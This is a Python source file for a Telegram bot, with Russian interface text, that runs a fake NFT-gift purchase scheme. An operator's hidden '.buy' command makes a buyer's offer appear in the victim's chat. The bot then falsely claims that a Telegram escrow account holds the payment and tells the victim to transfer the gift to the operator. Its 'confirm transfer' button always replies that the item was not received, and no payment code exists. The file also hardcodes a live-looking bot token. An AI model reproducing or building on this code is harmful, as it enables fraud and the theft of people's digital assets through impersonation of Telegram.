# bot_new.py — NFT Deal Bot | aiogram 3.31+ | Business Mode
import asyncio
import logging
import random
import re
import sqlite3
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, Message,
    LinkPreviewOptions
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

TOKEN    = "8726930734:AAESV0MI_3abx8lJwN9sJLuUfYSkiX_oKwY"
ADMIN_ID = 8926402887

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

# ── БД ───────────────────────────────────────────────────────
db = sqlite3.connect("deals.db", check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
CREATE TABLE IF NOT EXISTS deals (
    order_id        TEXT PRIMARY KEY,
    buyer_username  TEXT,
    chat_id         INTEGER,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    currency        TEXT DEFAULT 's',
    status          TEXT DEFAULT 'offer',
    created_at      TEXT,
    biz_id          TEXT,
    offer_msg_id    INTEGER,
    sent_at         TEXT
);
CREATE TABLE IF NOT EXISTS allowed_users (
    user_id         INTEGER PRIMARY KEY
);
CREATE TABLE IF NOT EXISTS allowed_usernames (
    username        TEXT PRIMARY KEY
);
""")
db.commit()


# ── Доступ ───────────────────────────────────────────────────
def is_allowed(user_id: int, username: str = None) -> bool:
    if user_id == ADMIN_ID:
        return True
    row = db.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,)).fetchone()
    if row:
        return True
    if username:
        uname = username.lstrip("@").lower()
        row2 = db.execute("SELECT 1 FROM allowed_usernames WHERE username=?", (uname,)).fetchone()
        if row2:
            return True
    return False

def add_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("INSERT OR IGNORE INTO allowed_users (user_id) VALUES (?)", (int(value.lstrip("@")),))
    else:
        db.execute("INSERT OR IGNORE INTO allowed_usernames (username) VALUES (?)", (value.lstrip("@").lower(),))
    db.commit()

def remove_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("DELETE FROM allowed_users WHERE user_id=?", (int(value.lstrip("@")),))
    else:
        db.execute("DELETE FROM allowed_usernames WHERE username=?", (value.lstrip("@").lower(),))
    db.commit()


# ── Хелперы ──────────────────────────────────────────────────
def gen_order_id() -> str:
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

def parse_nft(url: str):
    m = re.search(r"t\.me/nft/([A-Za-z]+)-(\d+)", url)
    if not m:
        return None, None
    return m.group(1), m.group(2)

def get_deal(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None

def upd(order_id: str, **kw):
    for k, v in kw.items():
        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
    db.commit()

def fmt_remaining(sent_at_str: str) -> str:
    sent_at   = datetime.fromisoformat(sent_at_str)
    deadline  = sent_at + timedelta(hours=6)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."

def fmt_amount(amount: int, currency: str) -> str:
    if currency == "s":
        return f"<b>{amount:,} ⭐️ Звёзд</b>"
    return f"<b>{amount:,} GRAM</b>"

def fmt_amount_plain(amount: int, currency: str) -> str:
    if currency == "s":
        return f"{amount:,} ⭐️ Звёзд"
    return f"{amount:,} GRAM"


# ── Тексты (из оригинала) ─────────────────────────────────────
def offer_text(d: dict) -> str:
    return (
        f"Пользователь предлагает вам "
        f"{fmt_amount(d['amount'], d['currency'])} за подарок "
        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>.\n\n"
        f"Оффер действителен ещё <b>{fmt_remaining(d['sent_at'])}</b>"
    )

def deal_text(d: dict) -> str:
    if d['currency'] == 's':
        escrow_cur = "Telegram Stars"
        credit_str = f"<b>{d['amount']:,} ⭐️ Звёзд</b>"
    else:
        escrow_cur = "GRAM"
        credit_str = f"<b>{d['amount']:,} GRAM</b>"

    return (
        f"Ордер <b>#{d['order_id']}</b>\n\n"
        f"Покупатель зарезервировал {fmt_amount(d['amount'], d['currency'])} через эскроу-систему "
        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс {escrow_cur} сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
        f"2. Нажмите «Передать NFT» и выберите "
        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"{credit_str} на ваш баланс. Резерв действует 24 часа."
    )


# ── Клавиатуры ───────────────────────────────────────────────
def offer_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text="Принять",   callback_data=f"accept:{order_id}"),
    )
    return kb.as_markup()

def deal_kb(d: dict):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text="Передать NFT ↗",
        url=f"tg://send_gift?to={d['buyer_username']}",
    ))
    kb.row(InlineKeyboardButton(
        text="Подтвердить передачу",
        callback_data=f"confirm:{d['order_id']}",
    ))
    return kb.as_markup()

def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="❌ Не передан",  callback_data=f"adm_no:{order_id}"),
    )
    return kb.as_markup()

def lp(nft_url: str) -> LinkPreviewOptions:
    return LinkPreviewOptions(
        url=nft_url,
        show_above_text=True,
        prefer_large_media=True,
    )


# ── Таймер оффера ────────────────────────────────────────────
async def offer_timer(order_id: str):
    while True:
        await asyncio.sleep(60)
        d = get_deal(order_id)
        if not d or d["status"] != "offer":
            break
        deadline = datetime.fromisoformat(d["sent_at"]) + timedelta(hours=6)
        if datetime.now() >= deadline:
            upd(order_id, status="expired")
            try:
                await bot.edit_message_text(
                    "Оффер истёк.",
                    business_connection_id=d["biz_id"] or None,
                    chat_id=d["chat_id"],
                    message_id=d["offer_msg_id"],
                    reply_markup=None,
                )
            except Exception:
                pass
            break
        try:
            await bot.edit_message_text(
                offer_text(d),
                business_connection_id=d["biz_id"] or None,
                chat_id=d["chat_id"],
                message_id=d["offer_msg_id"],
                reply_markup=offer_kb(order_id),
                link_preview_options=lp(d["nft_url"]),
            )
        except Exception:
            pass


# ── /start ───────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        await message.answer("👋 Добро пожаловать, админ.")
        return
    if not is_allowed(user_id, message.from_user.username):
        await message.answer("Бот недоступен.")
        return
    await message.answer(
        "Формат команды:\n"
        "<code>.buy https://t.me/nft/Name-123 500 s</code> — Stars\n"
        "<code>.buy https://t.me/nft/Name-123 7373 g</code> — GRAM"
    )


# ── /add /remove /users ───────────────────────────────────────
@dp.message(F.text.startswith("/add "))
async def cmd_add(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        val = message.text.split()[1]
        add_user(val)
        await message.answer(f"✅ Доступ выдан: {val}")
    except Exception:
        await message.answer("Формат: /add 123456789 или /add @username")

@dp.message(F.text.startswith("/remove "))
async def cmd_remove(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        val = message.text.split()[1]
        remove_user(val)
        await message.answer(f"✅ Доступ забран: {val}")
    except Exception:
        await message.answer("Формат: /remove 123456789 или /remove @username")

@dp.message(F.text == "/users")
async def cmd_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
    names = db.execute("SELECT username FROM allowed_usernames").fetchall()
    if not ids and not names:
        await message.answer("Список пуст.")
        return
    lines = [str(r["user_id"]) for r in ids] + ["@" + r["username"] for r in names]
    await message.answer("Пользователи с доступом:\n" + "\n".join(lines))


# ── .buy ─────────────────────────────────────────────────────
CMD_RE = re.compile(
    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)\s+(s|g)",
    re.IGNORECASE
)

@dp.message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
@dp.business_message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
async def cmd_buy(message: Message):
    biz_id = message.business_connection_id

    if biz_id:
        try:
            biz_conn = await bot.get_business_connection(biz_id)
            owner_id = biz_conn.user.id
            if message.from_user.id != owner_id:
                return
            owner_username = biz_conn.user.username
            if not is_allowed(owner_id, owner_username):
                await bot.send_message(owner_id, "У вас нет доступа к боту. Обратитесь к администратору.")
                return
            buyer_username = owner_username or str(owner_id)
        except Exception:
            return
    else:
        if not is_allowed(message.from_user.id, message.from_user.username):
            await message.answer("У вас нет доступа к боту.")
            return
        buyer_username = message.from_user.username or str(message.from_user.id)

    m = CMD_RE.match((message.text or "").strip())
    if not m:
        return

    nft_url  = m.group(1)
    amount   = int(m.group(2))
    currency = m.group(3).lower()

    slug, num = parse_nft(nft_url)
    if not slug:
        return

    # Удаляем .buy
    try:
        if biz_id:
            await bot.delete_business_messages(
                business_connection_id=biz_id,
                message_ids=[message.message_id],
            )
        else:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception as e:
        logging.error(f"delete .buy: {e}")

    order_id = gen_order_id()
    chat_id  = message.chat.id
    sent_at  = datetime.now().isoformat()

    db.execute("""
        INSERT INTO deals
          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
           amount, currency, status, created_at, biz_id, sent_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'offer', ?, ?, ?)
    """, (order_id, buyer_username, chat_id, nft_url, slug, num,
          amount, currency, sent_at, biz_id or "", sent_at))
    db.commit()

    d = get_deal(order_id)
    send_kw = {"business_connection_id": biz_id} if biz_id else {}

    try:
        msg = await bot.send_message(
            chat_id,
            offer_text(d),
            reply_markup=offer_kb(order_id),
            link_preview_options=lp(nft_url),
            **send_kw,
        )
        upd(order_id, offer_msg_id=msg.message_id)
        asyncio.create_task(offer_timer(order_id))
        logging.info(f"offer sent: {order_id} chat={chat_id} biz={biz_id}")
    except Exception as e:
        logging.error(f"SEND OFFER ERROR: {e!r}")
        return

    try:
        await bot.send_message(
            ADMIN_ID,
            f"📤 <b>Новый оффер отправлен</b>\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"NFT: <b>{slug} #{num}</b>\n"
            f"Сумма: <b>{fmt_amount_plain(amount, currency)}</b>\n"
            f"От: @{buyer_username}\n"
            f"Ссылка: {nft_url}",
        )
    except Exception as e:
        logging.error(f"admin offer notify: {e}")


# ── Принять ──────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d["status"] != "offer":
        await call.answer("Оффер недоступен.", show_alert=True)
        return

    upd(order_id, status="active")
    await call.answer(
        "Внимание!\n\n"
        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
        "Нажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )

    biz_id = d["biz_id"] or None
    try:
        await bot.edit_message_text(
            deal_text(d),
            business_connection_id=biz_id,
            chat_id=d["chat_id"],
            message_id=d["offer_msg_id"],
            reply_markup=deal_kb(d),
            link_preview_options=lp(d["nft_url"]),
        )
    except Exception as e:
        logging.error(f"edit to deal: {e}")

    # Отправляем карточку сделки покупателю отдельно (без biz_id)
    if biz_id:
        try:
            await bot.send_message(
                d["chat_id"],
                deal_text(d),
                reply_markup=deal_kb(d),
                link_preview_options=lp(d["nft_url"]),
            )
        except Exception as e:
            logging.error(f"send deal to buyer: {e}")


# ── Отклонить ────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status="declined")
    await call.answer("Вы отклонили оффер.")

    biz_id = d["biz_id"] or None
    try:
        await bot.edit_message_text(
            f"Оффер на NFT <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a> отменён.",
            business_connection_id=biz_id,
            chat_id=d["chat_id"],
            message_id=d["offer_msg_id"],
            reply_markup=None,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"edit decline: {e}")


# ── Подтвердить передачу ─────────────────────────────────────
@dp.callback_query(F.data.startswith("confirm:"))
async def cb_confirm(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d["status"] != "active":
        await call.answer("Ордер недоступен.", show_alert=True)
        return

    await call.answer(
        "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
        show_alert=True
    )

    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔔 Попытка подтверждения\n\n"
            f"Ордер: <b>{d['order_id']}</b>\n"
            f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
            f"Сумма: <b>{fmt_amount_plain(d['amount'], d['currency'])}</b>\n"
            f"Покупатель: @{d['buyer_username']}\n"
            f"Ссылка: {d['nft_url']}\n\n"
            f"Нажми если NFT реально передан:",
            reply_markup=admin_kb(order_id),
        )
    except Exception as e:
        logging.error(f"admin notify: {e}")


# ── Админ: подтвердить ───────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status="completed")
    await call.answer("Подтверждено.")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(f"Ордер {order_id} завершён.")

    biz_id = d["biz_id"] or None
    try:
        await bot.send_message(
            d["chat_id"],
            f"Передача подтверждена!\n\n"
            f"Ордер <b>{d['order_id']}</b>\n"
            f"{fmt_amount(d['amount'], d['currency'])} зачислены на ваш баланс.",
            business_connection_id=biz_id,
        )
    except Exception as e:
        logging.error(e)


# ── Админ: не передан ────────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status="active")
    await call.answer("Отклонено.")
    await call.message.edit_reply_markup(reply_markup=None)

    biz_id = d["biz_id"] or None
    try:
        await bot.edit_message_reply_markup(
            business_connection_id=biz_id,
            chat_id=d["chat_id"],
            message_id=d["offer_msg_id"],
            reply_markup=deal_kb(d),
        )
    except Exception as e:
        logging.error(e)


# ── Catch-all ────────────────────────────────────────────────
@dp.message()
async def catch_all(message: Message):
    if message.from_user.id == ADMIN_ID:
        return
    if not is_allowed(message.from_user.id, message.from_user.username):
        await message.answer("Бот недоступен.")


async def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
    await dp.start_polling(
        bot,
        skip_updates=True,
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ],
    )

if __name__ == "__main__":
    asyncio.run(main())
